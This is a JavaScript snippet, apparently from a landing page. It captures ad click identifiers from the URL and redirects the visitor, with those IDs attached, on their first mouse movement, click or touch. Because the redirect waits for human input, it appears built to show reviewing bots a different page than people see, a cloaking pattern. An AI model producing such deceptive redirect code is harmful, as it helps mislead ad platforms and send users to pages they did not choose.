document.addEventListener('DOMContentLoaded', function() {
		
		var urlParams = new URLSearchParams(window.location.search);
		
		var addParam = urlParams.get('gclid') || urlParams.get('gbraid') || urlParams.get('wbraid') || urlParams.get('msclkid') || urlParams.get('fbclid');
		
		var redirUrl = 'https://www.google.com';

		if (addParam) {
			var separator = redirUrl.indexOf('?') !== -1 ? '&' : '?';
			redirUrl += separator + 'subid=' + encodeURIComponent(addParam);
		}
		
		var load = function(event) {
				event.preventDefault();
				toggleDivs("sect1");
		};
		
		function toggleDivs(s){
			document.getElementById("sect1").classList.remove("shown");
			document.getElementById(s).classList.add("shown");
		};
		
		document.addEventListener('mousemove', load, { once: true });
		document.addEventListener('click', load, { once: true });
		document.addEventListener('touchstart', load, { once: true });
		
		function actions() {
			window.location.href = redirUrl;
		};
		
		document.addEventListener('mousemove', actions, { once: true });
		document.addEventListener('click', actions, { once: true });
		document.addEventListener('touchstart', actions, { once: true });
	});
